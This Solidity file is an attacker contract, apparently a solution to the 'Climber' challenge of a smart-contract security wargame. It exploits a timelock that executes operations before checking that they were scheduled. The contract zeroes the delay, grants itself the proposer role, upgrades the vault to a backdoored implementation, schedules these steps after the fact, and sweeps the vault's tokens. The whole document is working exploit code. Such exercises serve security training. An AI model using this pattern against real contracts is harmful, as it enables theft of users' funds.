// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "contracts/climber/ClimberTimelock.sol";
import "./ClimberEvilVault.sol";


contract ClimberAttacker {

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    ClimberTimelock timelock;
    bytes32 salt = keccak256("SALTY");

    function exploit(
        ClimberTimelock _timelock, 
        ClimberEvilVault _vault, 
        address _implementAddress,
        IERC20 _token
    )  external {
        timelock = _timelock;
        //// Add tasks to new schedule
        addTask(_timelock, _vault, _implementAddress);
        //// Execute
        _timelock.execute(targets, values, dataElements, salt);
        //// Execute backdoor
        _vault.freeSweep(_token, msg.sender);
    }

    function addTask(
        ClimberTimelock _timelock, 
        ClimberEvilVault _vault, 
        address _implementAddress
    ) internal {
        //// Set delay to zero
        targets.push(address(_timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        //// Get PROPOSER_ROLE for this contract
        targets.push(address(_timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)",  keccak256("PROPOSER_ROLE"), address(this)));
        //// Upgrade contract
        targets.push(address(_vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("upgradeTo(address)", _implementAddress));
        //// Create a schedule for all tasks
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("createSchedule()"));
    }

    function createSchedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}